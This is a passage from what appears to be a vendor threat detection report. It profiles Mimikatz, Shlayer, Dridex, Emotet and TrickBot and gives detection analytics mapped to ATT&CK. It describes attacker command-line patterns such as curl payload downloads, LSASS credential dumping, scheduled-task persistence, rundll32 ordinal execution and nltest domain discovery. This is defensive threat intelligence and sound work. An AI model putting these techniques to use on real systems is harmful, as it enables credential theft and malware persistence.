Kerberos ticket files (.kirbi) are of interest to adversaries as they\n\ncan contain sensitive data such as NTLM hashes that can be cracked offline.\n\nTo perform these attacks, a unique file extension variable is defined within\n\n**[Mimikatz that designates the default extension as .kirbi. Building detection](https://github.com/gentilkiwi/mimikatz/blob/master/inc/globals.h#L40)**\n\nanalytics around modification of files with this extension is another easy win\n\nas they can be a telltale sign that an adversary is in the midst of performing an\n\n[attack. One such attack, popularly known as “Kerberoasting,” occurs when](https://attack.mitre.org/techniques/T1558/003/)\n\nKerberos tickets are extracted from memory and the password of an account\n\nis cracked, allowing the adversary to pivot within the environment via a newly\n\nhijacked account. This type of attack thwarts basic foundational security\n\npractices such as only delegating permissions to user accounts with\n\nthe principle of least privilege.\n\nIt is important to note that while .kirbi files are utilized by Mimikatz, they are not\n\nexclusive to Mimikatz—multiple other hacking utilities interact with these files\n\n[following the Kerberos Credential format as well. In addition to using .kirbi](https://tools.ietf.org/html/rfc4120#section-5.8)\n\nfiles as a detection opportunity, incident responders should also remember to\n\nsanitize them as soon as possible, whether their generation was a function of\n\nsanctioned testing or otherwise.\n\n###### Detection opportunity 3\n\nSuspicious LSASS injection\n\n**ATT&CK technique(s): T1003 OS Credential Dumping**\n\n\n-----\n\n**ATT&CK tactic(s): Credential Access**\n\n**Details: Credential dumping is the name of the game for Mimikatz. To be**\n\nsuccessful, Mimikatz must interact with the Local Security Authority Subsystem\n\nService (LSASS), which provides a great opportunity for detection. Mimikatz\n\n[requires specific process access rights to initiate cross process injection via the](https://docs.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights)\n\n**[Kernel32 OpenProcess function: PROCESS_VM_READ 0x0010 and PROCESS_](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess)**\n\n**QUERY_LIMITED_INFORMATION 0x1000. These permissions, collectively**\n\nobserved via the bitmask 0x1010, are relatively rare for lsass.exe under normal\n\nconditions.\n\nWhile identifying processes that are initiating cross process injections may\n\nprovide a foundation for detecting Mimikatz, this can be a bit noisy. A good\n\nway to filter things down may be to focus around the loading of other suspect\n\nlibraries such as the SAM Library (samlib.dll) and the Credential Vault Client\n\nLibrary (vaultcli.dll). With this information you can identify instances of\n\nMimikatz, as well as other credential theft tools, with a higher degree of\n\nconfidence.\n\n[The below detection demonstrates Blue Mockingbird using Mimikatz (renamed](https://redcanary.com/blog/blue-mockingbird-cryptominer/)\n\nas mx.exe) to perform credential dumping via LSASS injection.\n\n\n###### Aaron Didier\n\n**I N T E L L I G E N C E**\n**A N A LY S T**\n\nAaron is an unconventional autodidact\n\nwho got their start in information\n\nsecurity as a “terminally curious”\n\nmember of a network operations team\n\nat a small regional WISP, addressing\n\nabuse@ emails, digging into netflow,\n\nand responding to VoIP attacks. Prior\n\nto joining the flock at Red Canary,\n\nAaron was a member of the Motorola\n\nSolutions SOC, where they contributed\n\nto the creation of a Security Onion\ninspired RHEL IDS known as Red Onion.\n\nThey also spent time briefly at Baker\n\nMcKenzie administering CB Response\n\nand Protect while mapping to the\n\nATT&CK Framework. In their off hours,\n\nyou may catch Aaron digging just about\n\nanywhere, be it in the garden, in a\n\nbook, in a 10-k report, capture the flag\n\nevent, Twitter post, or documentary.\n\nTheir fascination for the world knows\n\nno bounds and they love sharing\n\neverything they’ve learned with anyone\n\nwilling to listen.\n\n\n-----\n\n###### T H R E AT\n\n##### Shlayer\n\nShlayer, a trojan known for delivering malicious adware, is the only macOSspecific threat to make it into our top 10. In 2020, we observed Shlayer\ncontinue to masquerade as Adobe Flash Player while changing its distribution\ninfrastructure to leverage Amazon Web Services (AWS).\n\n##### Analysis\n\nShlayer is a macOS malware family associated with ad fraud activity through the\n\ndistribution of adware applications. The trojan masquerades as an installer for\n\napplications like Adobe Flash Player and executes numerous macOS commands\n\nto deobfuscate code and install adware with persistence mechanisms. In August\n\n[2020, Objective-See reported that Shlayer was the first malicious code to be](https://objective-see.com/blog/blog_0x4E.html)\n\nnotarized by Apple, granting it privileges to execute with default configurations\n\nof macOS Gatekeeper. Shlayer commonly delivers payloads such as AdLoad\n\nand Bundlore. Bundlore is frequently delivered as a second-stage payload,\n\nwhich often results in overlaps in public reporting in which certain TTPs are\n\ntracked under Bundlore by some teams and under Shlayer by others. Shlayer\n\nand Bundlore are similar but have slightly different download, execution, and\n\ndeobfuscation patterns that all involve curl, unzip, and openssl with certain\n\ncommand lines.\n\n###### Tweaks in TTPs\n\nMost of the traditional Shlayer TTPs remained the same throughout 2020, with\n\nonly slight variations. For example, midway through the year we observed\n\nShlayer begin to obfuscate portions of its payloads within a single shell script.\n\nWhile executing the beginning of the same script, it would issue tail commands\n\nto separate the bytes of the payload from the script for execution. (This behavior\n\n[was consistent with the variant identified as ZShlayer by SentinelOne.) In](https://www.sentinelone.com/blog/coming-out-of-your-shell-from-shlayer-to-zshlayer/)\n\naddition, Shlayer moved to using the AWS Cloudfront CDN and S3 data storage\n\nbuckets for infrastructure, eschewing their own custom-named domains that\n\nwould occasionally rotate out.\n\n###### Malicious adware at a glance\n\nWhile Shlayer has historically been heavily tied to ad fraud, the nature of the\n\n\n###### OVERALL RANK\n\n#### 6%\n\n###### CUSTOMERS AFFECTED\n\n\n-----\n\nmalware and mechanisms for persistence provide all the infrastructure to\n\nquickly turn Shlayer into a delivery mechanism for more nefarious payloads.\n\nAdditionally, Shlayer uses masquerading and obfuscation techniques that\n\nclearly demonstrate an intention to hide. For these reasons, we classify Shlayer\n\nas malware, reflecting that we think it’s more nefarious than software with a\n\ndemonstrable benefit to an end-user and is therefore worth paying attention\n\n[to. Researcher Amit Serper summarized this sentiment well: “Adware is just](https://twitter.com/virusbtn/status/1032620982194909184)\n\nmalware with a legal department.”\n\nWe weren’t surprised to see Shlayer make it into our top 10 for 2020, as the most\n\ncommon macOS threats we see day to day are related to malicious adware.\n\n[Other researchers have noted this pattern as well, including Thomas Reed of](https://blog.malwarebytes.com/mac/2020/02/mac-adware-is-more-sophisticated-dangerous-than-traditional-mac-malware/)\n\nMalwarebytes.\n\nWe’ve found significant overlap in TTPs between malicious adware and non\nadware threats such as modifying SSH Authorized Keys and using SCP to\n\ncircumvent controls on macOS. By working to detect behaviors like these, we’ve\n\nfound success in detecting a range of macOS threats.\n\n##### Detection opportunities\n\n###### Detection opportunity 1\n\nDownloading with curl flags -f0L\n\n**ATT&CK technique(s): T1105 Ingress Tool Transfer**\n\n**ATT&CK tactic(s): Command and Control**\n\n**Details: An evergreen hallmark of Shlayer activity is execution of curl to**\n\ndownload a payload while specifying -f0L as command-line arguments. These\n\narguments cause curl to use HTTP 1.0 and ignore failures, and the arguments\n\nare distinctive to this threat. The instances of curl provide victim data to the\n\nadversary while also downloading a later-stage payload for execution.\n\n\n-----\n\n###### Detection opportunity 2\n\nUnzipping password-protected ZIP archives in /tmp\n\n**ATT&CK technique(s): T1140 Deobfuscate/Decode Files or Information**\n\n**ATT&CK tactic(s): Defense Evasion**\n\n**Details: Shlayer and other malware threats often deploy payloads using**\n\npassword-protected ZIP archives and unpack them in temporary folders during\n\ninstallation. Some malware threats also use the ditto process to perform the\n\nsame action, eschewing unzip. For this detection analytic, focus on instances of\n\n**unzip with the command-line argument -P, indicating a password is used and -d**\n\nspecifying the archive is unzipped into a folder. We generally regard unzipping\n\na password-protected archive from /tmp into a folder under /tmp as suspicious\n\nbecause it implies obfuscation. We don’t observe much, if any, standard\n\ninstallation or maintenance activity using this pattern because it doesn’t usually\n\nneed obfuscation via encryption. For false positives, consider tuning out activity\n\nfrom unique system administration tools for your environment that may use\n\npassword-protected ZIPs during deployment.\n\n###### Detection opportunity 3\n\nDeobfuscating payloads with openssl\n\n**ATT&CK technique(s): T1140 Deobfuscate/Decode Files or Information**\n\n**ATT&CK tactic(s): Defense Evasion**\n\n**Details: Shlayer and other malware threats often use openssl to remove Base64**\n\nencoding and additional encryption from deployed payloads before execution.\n\nThis allows the malware to bypass controls in obfuscated form and execute\n\nsuccessfully at the endpoint. We do observe legitimate Base64 decoding, but\n\nmostly with the base64 **-d command rather than using openssl. A detection**\n\nanalytic looking for openssl containing base64 in the command line will help\n\nyou catch this behavior. As always, you’ll need to tune out legitimate activity,\n\nwhich we commonly observe related to system management software.\n\n\n###### Tony Lambert\n\n**I N T E L L I G E N C E**\n**A N A LY S T**\n\nTony is a professional geek who loves\n\nto jump into all things related to\n\ndetection and digital forensics. After\n\nworking in enterprise IT administration\n\nand detection engineering for several\n\nyears, he now applies his DFIR\n\nskills to research malware, detect\n\nmalicious activity, and recommend\n\nremediation paths. Tony is a natural\n\nteacher and regularly shares his\n\nfindings and expertise through blogs,\n\nresearch reports, and presentations at\n\nconferences and events.\n\n\n-----\n\n###### T H R E AT\n\n##### Dridex\n\nDridex is a banking trojan commonly distributed through emails containing\nmalicious Excel documents. Researchers have tied Dridex operations to\nother malware toolkits such as Ursnif, Emotet, TrickBot, and DoppelPaymer\nransomware.\n\n##### Analysis\n\nDridex is a well known banking trojan that shares both code similarities and\n\noverlapping infrastructure with Gameover Zeus. The operators of Dridex are\n\n[referred to by various names, including TA505 and INDRIK SPIDER. When it](https://www.proofpoint.com/us/threat-insight/post/threat-actor-profile-ta505-dridex-globeimposter)\n\n[first showed up on the scene in 2014, it delivered malicious Word documents](https://www.trendmicro.com/vinfo/us/threat-encyclopedia/web-attack/3147/dealing-with-the-mess-of-dridex)\n\ncontaining VBA macros. Over the years it has used other formats such as\n\nmalicious JavaScript and Excel documents. Even though the initial payload\n\ndelivery format has changed, Dridex has consistently focused on getting into\n\nuser mailboxes and ushering users into unwittingly executing malicious code\n\non their endpoints. Malicious emails containing Dridex attachments encourage\n\nclicking by giving the attached Excel documents enticing names like “Invoice,”\n\n“Inv,” “Outstanding,” “Payment,” or “Statement.”\n\n###### XLM macros\n\nWith the most recent shift in 2020, Dridex moved from delivering malicious\n\nJavaScript files to delivering malicious Excel documents leveraging the\n\nunderlying Excel 4.0 macro (XLM) functionality. XLM macros were made available\n\nto Excel users in 1992. These macros utilize the Binary Interchange File Format\n\n[(BIFF), an early cousin of the better-known Visual Basic for Applications (VBA)](https://www.loc.gov/preservation/digital/formats/fdd/fdd000510.shtml)\n\nmacros. Excel 4.0 macros offer similar functionality as VBA macros but give\n\nadversaries the distinct advantage of being able to hide in plain sight; macro\n\ncode can be spread throughout a spreadsheet over disparate cells, rendering\n\nanalysis difficult and making it not immediately obvious that executable code is\n\neven present.\n\nPreviously, XLM also allowed code execution without being subjected to the\n\n[scrutiny of the Microsoft Antimalware Scan Interface (AMSI), which made](https://docs.microsoft.com/en-us/windows/win32/amsi/antimalware-scan-interface-portal)\n\nit easier for Dridex and other malware to use XLM to evade defenses. As of\n\n[March 2021, Microsoft has added AMSI coverage for Excel 4.0 macros,](https://www.microsoft.com/security/blog/2021/03/03/xlm-amsi-new-runtime-defense-against-excel-4-0-macro-malware/)\n\nenabling vendors to acquire insight into runtime execution. Ultimately, if\n\n\n###### OVERALL RANK\n\n#### 5.8%\n\n###### CUSTOMERS AFFECTED\n\n\n-----\n\nyour organization doesn’t have a business use for executing macros in your\n\n[environment, it’s better to disable them altogether.](https://support.microsoft.com/en-us/topic/enable-or-disable-macros-in-office-files-12b036fd-d140-4e74-b45e-16fed1a7e5c6?ui=en-us&rs=en-us&ad=us)\n\n###### Later stages\n\nThinking beyond the initial delivery, one of the most common techniques we\n\n[observed Dridex using throughout the year was DLL search order hijacking of](https://attack.mitre.org/techniques/T1574/001/)\n\nvarious legitimate Windows executables. The Dridex operators don’t stick to a\n\nsingle Windows executable when doing search order hijacking, necessitating\n\nmultiple detection analytics to catch this behavior. We also observed Dridex\n\npersisting as a scheduled task. In fact, Dridex’s place in our top 10 threats is\n\ndue in no small part to scheduled tasks left over from incomplete remediation\n\nefforts. This pattern emphasizes the importance of cleaning up persistence\n\nwhen responding to threats.\n\nWhile Dridex is a threat in and of itself, in 2020 we also observed multiple\n\nenvironments where Dridex led to the ransomware family DoppelPaymer—and\n\nwe’ve observed the same pattern in early 2021. Similar to other “ransomware\n\nprecursor” families in our top 10 such as TrickBot, Emotet, and Qbot, the threat\n\nof follow-on ransomware emphasizes the need for quick identification and\n\nremediation of Dridex in any environment. Given the long history of Dridex\n\nconsistently evolving to combat modern-day security controls while maintaining\n\nthe same means of payload delivery, the best way to protect your organization\n\nfrom Dridex is filtering emails at your mail gateways to prevent its delivery.\n\n##### Detection opportunities\n\n###### Detection opportunity 1\n\nScheduled task creation containing system directory\n\n**ATT&CK technique(s): T1053.005 Scheduled Task/Job: Scheduled Task**\n\n**ATT&CK tactic(s): Persistence**\n\n**Details: Dridex maintains persistence via the creation of scheduled tasks**\n\n(schtasks.exe) within system directories such as windows\\system32\\, windows\\\n\n**syswow64, winnt\\system32 and winnt\\syswow64. Identifying the instances**\n\nof schtasks.exe where the command line contains both the flag /create and a\n\nsystem path often helps us identify existing or residual instances of Dridex on\n\nan endpoint.\n\n\n-----\n\n###### Detection opportunity 2\n\nExcel spawning regsvr32.exe\n\n**ATT&CK technique(s): T1218.010 Signed Binary Proxy Execution: Regsvr32**\n\n**ATT&CK tactic(s): Defense Evasion**\n\n**Details: Dridex uses Excel macros as a springboard to initiate additional**\n\nmalicious code via Register Server (regsvr32.exe). While files called by regsvr32\n\ntraditionally end in .dll (as in the first example below), we often observe this\n\nthreat and others using different file extensions to avoid recognition as a DLL (as\n\nin the second example below). Detecting this type of activity can be as easy as\n\nidentifying any instances where excel.exe is spawning regsvr32.exe as a child\n\nprocess, as this activity is uncommon in most environments.\n\n###### Detection opportunity 3\n\nDLL search order hijacking\n\n**ATT&CK technique(s): T1574.001 Hijack Execution Flow: DLL Search**\n\nOrder Hijacking\n\n**ATT&CK tactic(s): Persistence, Privilege Escalation, Defense Evasion**\n\n**[Details: Another opportunity for detection is based around search order](https://redcanary.com/blog/hijack-my-hijack-my-hijack-my-dll/)**\n\n\n-----\n\n**[hijacking. This type of attack is successful when a Windows native binary](https://redcanary.com/blog/hijack-my-hijack-my-hijack-my-dll/)**\n\nexecutes from within a directory that contains one or more malicious DLL\n\nbinaries. These unassuming DLLs are loaded and executed by the trusted native\n\nbinary due to their location. This type of activity is most easily identified when\n\n[a native system binary is executed from a non-standard location, such as](https://redcanary.com/blog/process-masquerading/)\n\n**Appdata\\Local or Appdata\\Roaming. This detection opportunity requires some**\n\nwork: start by cataloging all native Windows binaries, and then write detection\n\nanalytics for any instances where these binaries are executed from anywhere\n\nother than their standard locations. Admittedly, this leads to a lot of detection\n\nanalytics due to the volume of native Windows binaries, but we’ve found that\n\ncreating these analytics is worth the effort to catch Dridex as well as other\n\nthreats that use DLL search order hijacking.\n\n\n###### Aaron Didier\n\n**I N T E L L I G E N C E**\n**A N A LY S T**\n\nAaron is an unconventional autodidact\n\nwho got their start in information\n\nsecurity as a “terminally curious”\n\nmember of a network operations team\n\nat a small regional WISP, addressing\n\nabuse@ emails, digging into netflow,\n\nand responding to VoIP attacks. Prior\n\nto joining the flock at Red Canary,\n\nAaron was a member of the Motorola\n\nSolutions SOC, where they contributed\n\nto the creation of a Security Onion\ninspired RHEL IDS known as Red Onion.\n\nThey also spent time briefly at Baker\n\nMcKenzie administering CB Response\n\nand Protect while mapping to the\n\nATT&CK Framework. In their off hours,\n\nyou may catch Aaron digging just about\n\nanywhere, be it in the garden, in a\n\nbook, in a 10-k report, capture the flag\n\nevent, Twitter post, or documentary.\n\nTheir fascination for the world knows\n\nno bounds and they love sharing\n\neverything they’ve learned with anyone\n\nwilling to listen.\n\n\n-----\n\n###### T H R E AT\n\n##### Emotet\n\nEmotet is a trojan known for delivering follow-on payloads, including TrickBot,\nQbot, and, in some cases, Ryuk ransomware. After a hiatus in early 2020, Emotet\nmade a comeback over the summer and remained steady until the January\n2021 takedown.\n\n##### Analysis\n\nEmotet is an advanced, modular banking trojan that primarily functions as a\n\ndownloader or dropper of other malware. It’s disseminated through malicious\n\nemail links or attachments that use branding familiar to the recipient. Emotet\n\nfocuses on stealing user data and banking credentials, and opportunistically\n\ndeploys itself to victims. Emotet is polymorphic, meaning it often evades typical\n\nsignature-based detection, making it more challenging to detect. Emotet\n\n[is also virtual machine aware and can generate false indicators if run in a](https://attack.mitre.org/techniques/T1497/)\n\nvirtual environment, further frustrating defenders. Emotet has been active and\n\nevolving since 2014.\n\n###### An eventful year\n\nIn the latter half of 2020 we observed Emotet detections transition from\n\nexecution via an executable on disk to a dynamically linked library (DLL)\n\nexecuted via rundll32. This is an evolution we have seen other malware, like\n\nQbot, adopt in 2020 as well, as it gives the operator flexibility and additional\n\ndefense evasion opportunities. We also observed Emotet adopt techniques to\n\nbreak the parent-child relationship in process telemetry. This is likely an effort\n\nto evade detection analytics designed to alert on unusual child processes.\n\nThese processes often spawn from common phishing lures, often incorporating\n\nMicrosoft Office products.\n\nEmotet had multiple dormant periods throughout the year, which is consistent\n\n[with previous patterns of going dark for several months at a time. The](https://www.proofpoint.com/us/threat-insight/post/emotet-returns-after-holiday-break-major-campaigns)\n\nmalware started 2020 strong as we observed a significant number of detections\n\nin January, but it gradually decreased until we observed no Emotet detections\n\n[in June. Emotet returned with significant detection volume in July—a pattern](https://www.proofpoint.com/us/blog/security-briefs/emotet-returns-after-five-month-hiatus)\n\n**[others noticed as well—and based on our visibility, remained consistent](https://www.proofpoint.com/us/blog/security-briefs/emotet-returns-after-five-month-hiatus)**\n\nthrough October before another quiet month in November.\n\n\n###### OVERALL RANK\n\n#### 5.8%\n\n###### CUSTOMERS AFFECTED\n\n\n-----\n\nIt’s unclear why Emotet went dormant for part of 2020; potential explanations\n\ninclude possible retooling and transitioning to new affiliations to drop follow-on\n\npayloads. It’s also important to note that the patterns we observe don’t present\n\na complete picture of what’s happening in the wild. For example, the lack of\n\nEmotet activity we observed in November could be due to an increase in it being\n\ncaught by perimeter defenses and not making it to the endpoints we monitor.\n\n###### Payload patterns\n\nIn addition to changes in Emotet’s activity level throughout the year, we also\n\nobserved patterns in the follow-on malware families it dropped. Throughout\n\n2020, Emotet continued the years-long pattern of dropping TrickBot as follow\n[on malware, which sometimes led to Ryuk ransomware. Notably, after Emotet](https://redcanary.com/blog/ryuk-ransomware-attack/)\n\nreturned in July, it also began delivering Qbot in some campaigns—but didn’t\n\n[abandon delivering TrickBot entirely. In mid-October, CrowdStrike reported](https://www.crowdstrike.com/blog/wizard-spider-adversary-update/)\n\n[that they observed Emotet resuming delivery of TrickBot in a likely attempt to](https://blogs.microsoft.com/on-the-issues/2020/10/12/trickbot-ransomware-cyberthreat-us-elections/)\n\n**[replenish the adversaries’ victim base following disruption by industry and](https://blogs.microsoft.com/on-the-issues/2020/10/12/trickbot-ransomware-cyberthreat-us-elections/)**\n\nlaw enforcement.\n\n###### Looking ahead\n\n[On January 27, 2021, Europol announced a major international takedown](http://europol.europa.eu/newsroom/news/world’s-most-dangerous-malware-emotet-disrupted-through-global-action)\n\neffort of the Emotet botnet. Only time will tell if we see a reorganization and\n\nresurgence of Emotet, or if the criminals behind the operation will pivot to a\n\ndifferent toolkit or business model. Until then, we can still learn from previous\n\nEmotet behaviors and implement detection analytics to help address it as\n\nwell as other threats. Should Emotet return, its ties to ransomware make\n\nrapid response to infections a high priority. If organizations are able to detect\n\nand respond to the early stages of an infection chain, whether it uses Emotet\n\nor another family, the chances of receiving follow-on ransomware decrease\n\nsignificantly.\n\n##### Detection opportunities\n\n###### Detection opportunity 1\n\nPowerShell string obfuscation\n\n**ATT&CK technique(s): T1059.001 Command and Scripting Interpreter:**\n\nPowerShell, T1027 Obfuscated Files or Information\n\n**ATT&CK tactic(s): Execution**\n\n**Details: Emotet was primarily delivered through malicious documents that**\n\n\n-----\n\nexecuted heavily obfuscated PowerShell. Though obfuscation is meant to\n\ndeter defenders, we can use it to create detection analytics. One way to\n\ndetect Emotet’s obfuscated code is to look for a PowerShell process executing\n\n[commands that use the format operator](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_operators?view=powershell-7.1) **-f to concatenate strings. To further**\n\nrefine the analytic, you can also look for the format indexes {0} and {1}. In many\n\nmalicious instances of PowerShell, the format indices will be out of order, as\n\nwe see in the following decoded PowerShell string used by Emotet, {3}{1}{0}{2}.\n\nSuch an analytic may require additional tuning for other normal-format index\n\nstrings that are common in your environment.\n\n###### Detection opportunity 2\n\nRundll32 execution by ordinal\n\n**ATT&CK technique(s): T1218.011 Signed Binary Proxy Execution: Rundll32**\n\n**ATT&CK tactic(s): Defense Evasion**\n\n**Details: In the latter half of 2020, we observed Emotet begin using execution**\n\nby ordinal via rundll32.exe. An ordinal is the numeric position of the exported\n\nfunction in the DLL Export Address table. We have had success detecting this by\n\nlooking for rundll32.exe executing DLL export functions by ordinal, which are\n\ndenoted by #. In the example below, the DLL is Chpieog.dll and the ordinal is #1.\n\nWe detect this simply by looking for rundll32 process execution with command\n\nlines matching a regular expression for ordinal calls. While this is a legitimate\n\nway to execute a DLL, it’s fairly rare, and our strategy has proven successful in\n\nidentifying the early stages of Emotet execution.\n\n\n-----\n\n###### Detection opportunity 3\n\nPowerShell executing processes using wmiclass\n\n**ATT&CK technique(s): T1059.001 Command and Scripting Interpreter:**\n\nPowerShell, T1047 Windows Management Instrumentation\n\n**ATT&CK tactic(s): Execution**\n\n**Details: In some Emotet campaigns we observed the WMI Provider Host**\n\n(wmiprvse.exe) spawning PowerShell with an encoded command. After\n\ndecoding the first layer, we noticed use of the wmiclass .NET class to call the\n\n[Create method of the Win32_Process class in order to execute the Emotet](https://docs.microsoft.com/en-us/windows/win32/cimwin32prov/create-method-in-class-win32-process)\n\npayload. To detect this behavior we look for PowerShell processes with a\n\ndecoded command line containing references to wmiclass and win32_process.\n\nPowerShell command-line detection analytics are always at risk of evasion\n\nthrough obfuscation, but we found this analytic to be reliable in finding Emotet\n\nin 2020.\n\n###### Bonus forensic analysis opportunity\n\nIdentifying Emotet maldocs with a broken parent-child process chain\n\n**Details: Emotet campaigns sometimes feature the intentional circumvention**\n\nof the creation of a direct child process of an Office application. Subsequent\n\nmalicious Emotet processes spawn as child processes of wmiprvse.exe by\n\nproxying execution through COM and WMI. Generally speaking, processes that\n\nspawn as a child of an Office application are less frequent and can be subject to\n\nmore defender scrutiny. By spawning indirectly as a child of wmiprvse.exe, this\n\nbehavior offers an adversary two distinct potential advantages:\n\n\n-----\n\n1. Many security products are unable to reconstruct the broken process chain\n\ncaused by proxying execution through COM, so it can be difficult to enrich\n\ndata sources based on context alone\n\n2. Child processes of wmiprvse.exe are common. For example, in SCCM\n\nenvironments, WMI and COM are used heavily to remotely spawn processes\n\nEven though adversaries try to evade defenses by breaking process chains, we\n\ncan still detect and investigate their behavior. When we observed Emotet using\n\nthis technique, we still wanted to identify the offending malicious document\n\nthat executed the processes, so we figured out a regular procedure to find the\n\noriginal maldoc. We thought it would be useful to share the steps we use to find\n\nthe maldoc in case you find yourself in a similar situation.\n\n1. Search within a time window of execution of the first detected process.\n\nFor example, if we detected wmiprvse.exe spawning powershell.exe to\n\nexecute an encoded command to download the Emotet payload, and\n\n**powershell.exe started at 13:00 hours UTC (UTC or GTFO), we would search**\n\nbetween 12:59-13:01. We would gradually expand our search to 12:55-13:05\n\nhours and beyond if we didn’t find the maldoc in the first search\n\n2. Because we suspect a malicious document, filter the process search results\n\nfor Microsoft Office products\n\n3. Narrow the search even further by filtering the resulting Office processes\n\nfor module loads of VBA-related DLLs, including vbeui.dll and vbe7.dll. The\n\npresence of these DLLs being loaded is a potential indicator of macro use\n\n4. Check the file modifications and command line of the remaining processes\n\nfor malicious documents\n\n\n###### Kyle Rainey\n\n**I N T E L L I G E N C E**\n**A N A LY S T**\n\nKyle has been providing proactive\n\nand reactive incident response and\n\nforensics services to Fortune 500\n\ncompanies for over five years. As an\n\nintelligence analyst at Red Canary,\n\nhe leverages his years of experience\n\nconducting investigations and building\n\ndetections in order to engineer\n\nimpactful, scalable intelligence\n\nproducts. Kyle is passionate about\n\nsolving hard problems and constantly\n\nlearning.\n\n\n-----\n\n###### T H R E AT\n\n##### TrickBot\n\nTrickBot is a modular banking trojan that has led to ransomware such as Ryuk\nand Conti. 2020 signaled a significant decrease in the prevalence and efficacy\nof TrickBot.\n\n##### Analysis\n\nTrickBot is a modular banking trojan that targets users’ financial information\n\n[and acts as a dropper for other malware. Believed to be operated by a single](https://intel471.com/blog/understanding-the-relationship-between-emotet-ryuk-and-trickbot/)\n\n**[group as a service, different users of the service tend to use different initial](https://intel471.com/blog/understanding-the-relationship-between-emotet-ryuk-and-trickbot/)**\n\ninfection vectors for TrickBot, often first infecting systems with another malware\n\nfamily such as Emotet or IcedID. In some cases, TrickBot is the initial payload\n\ndelivered directly from malicious email campaigns.\n\nTrickBot primarily steals sensitive data and credentials and also has multiple\n\nadditional modules enabling a more fully featured malware service. It has\n\ndelivered follow-on payloads like Cobalt Strike that eventually lead to Ryuk and\n\n[Conti ransomware. Other research teams have linked TrickBot code similarities](https://www.cybereason.com/blog/a-bazar-of-tricks-following-team9s-development-cycles)\n\nto other malware families such as BazarBackdoor, PowerTrick, and Anchor. The\n\nthreat group behind the development of these malware toolkits is referred to as\n\n**[WIZARD SPIDER by CrowdStrike.](https://www.crowdstrike.com/blog/wizard-spider-adversary-update/)**\n\n###### Infrastructure takedown\n\nThis year’s big news around TrickBot occurred in October 2020, when U.S. Cyber\n\n[Command and Microsoft conducted takedowns of TrickBot infrastructure.](https://blogs.microsoft.com/on-the-issues/2020/10/12/trickbot-ransomware-cyberthreat-us-elections/)\n\n[Researchers throughout the community debated how effective these](https://intel471.com/blog/trickbot-update-november-2020-bazar-loader-microsoft/)\n\ntakedowns were, but generally agreed there was some disruption. From Red\n\nCanary’s perspective, we saw no TrickBot activity in October, followed by\n\nfairly low numbers in November and December as compared to the rest of\n\n2020. Around the same time of TrickBot’s decline, we also observed a rise in\n\n[the prevalence of Bazar. While correlation is not causation, the timing of these](https://redcanary.com/blog/how-one-hospital-thwarted-a-ryuk-ransomware-outbreak/)\n\npatterns suggests WIZARD SPIDER (or other identifiers for the operators of these\n\nfamilies) may have switched focus from TrickBot to Bazar.\n\n\n###### OVERALL RANK\n\n#### 5.1%\n\n###### CUSTOMERS AFFECTED\n\n\n-----\n\n###### Decline in prevalence\n\nWe observed TrickBot in fewer detections in 2020 as compared to 2019.\n\nMultiple TrickBot outbreaks in 2019 contributed largely to some of the top\n\ntechniques in last year’s report, including Process Injection and Scheduled\n\nTask. While TrickBot still made it into our top 10 for 2020, it did not run rampant\n\nin environments in the same way we observed the previous year. Many of our\n\nTrickBot detections were only on the initial malicious executable being written,\n\nand we did not observe follow-on execution. Others were leftover TrickBot\n\npersistence via scheduled tasks that had not been cleaned up. Overall, this tells\n\nus that throughout 2020, TrickBot had less success in follow-on exploitation\n\nthan it did in 2019. This suggests, but does not confirm, that TrickBot may have\n\nalready been decreasing in prevalence and effectiveness throughout 2020, and\n\nthe takedown operations may have just added on to that decline.\n\n##### Detection opportunities\n\n###### Detection opportunity 1\n\nUnusual port connections from svchost.exe\n\n**ATT&CK technique(s): T1571 Non-Standard Port**\n\n**ATT&CK tactic(s): Command and Control**\n\n**[Details: We as well as others in the community noticed that, soon after TrickBot](https://unit42.paloaltonetworks.com/wireshark-tutorial-examining-trickbot-infections/)**\n\nis installed, it makes outbound network connections over HTTPS using TCP\n\nports 443, 447, and 449. Furthermore, these connections came from svchost.\n\n**[exe. Based on this information and a “know normal, find evil” mindset, we](https://www.sans.org/security-resources/posters/dfir/dfir-find-evil-35)**\n\ndetermined it was unusual in most environments for svchost to make external\n\nconnections over ports 447 and 449 and decided to create a detection analytic.\n\nThis same analytic approach would work for other threats as well: if you notice a\n\nthreat using non-standard ports, that can be a good opportunity for detection.\n\n\n-----\n\n###### Detection opportunity 2\n\nScheduled task execution from %appdata%\n\n**ATT&CK technique(s): T1053.005 Scheduled Task/Job: Scheduled Task**\n\n**ATT&CK tactic(s): Persistence**\n\n**Details: Detecting malicious persistence at scale can be difficult in**\n\nenvironments with a lot of different applications setting up legitimate\n\npersistence and executing from scheduled tasks. Though detecting the\n\nexecution of every scheduled task can be too noisy in some environments,\n\nwe’ve found that narrowing down scheduled task execution to certain folders\n\ncommonly used by adversaries can help identify evil. In the case of TrickBot,\n\nwe observed it regularly creating scheduled tasks that contain the folder of\n\n**Appdata\\Roaming. A useful analytic we created to detect TrickBot and other**\n\nthreats is looking for a parent process of taskeng.exe or svchost.exe executing\n\nan .exe located in Appdata\\Roaming. This is one that will take a little tuning\n\nbased on the environment, but once tuned, should be helpful for finding evil.\n\n###### Detection opportunity 3\n\nEnumerating domain trusts activity with nltest.exe\n\n**ATT&CK technique(s): T1482 Domain Trust Discovery**\n\n**ATT&CK tactic(s): Discovery**\n\n**Details: We observed operators of TrickBot using nltest.exe to make domain**\n\ntrust determinations. While you probably can’t disable nltest.exe, looking for\n\ninstances of it executing with a command line that includes /dclist:<domain>,\n\n**/domain_trusts or /all_trusts has proven to be a high-fidelity analytic to catch**\n\n[follow-on activity to both TrickBot as well as Bazar (which didn’t make it into](https://redcanary.com/blog/how-one-hospital-thwarted-a-ryuk-ransomware-outbreak/)\n\nour top 10, due in part to its emergence partway through the year). The use of\n\nnltest means discovery activity is occurring beyond initial access and that Cobalt\n\n[Strike and ransomware such as Ryuk aren’t far behind.](https://redcanary.com/blog/ryuk-ransomware-attack/)\n\n\n###### Katie Nickels\n\n**D I R E C T O R O F**\n**I N T E L L I G E N C E**\n\nKatie has worked in Security\n\nOperations Centers and cyber threat\n\nintelligence for nearly a decade,\n\nhailing from a liberal arts background\n\nwith degrees from Smith College and\n\nGeorgetown University. Prior to joining\n\nRed Canary, Katie was the ATT&CK\n\nThreat Intelligence Lead at The MITRE\n\nCorporation, where she focused on\n\napplying cyber threat intelligence\n\nto 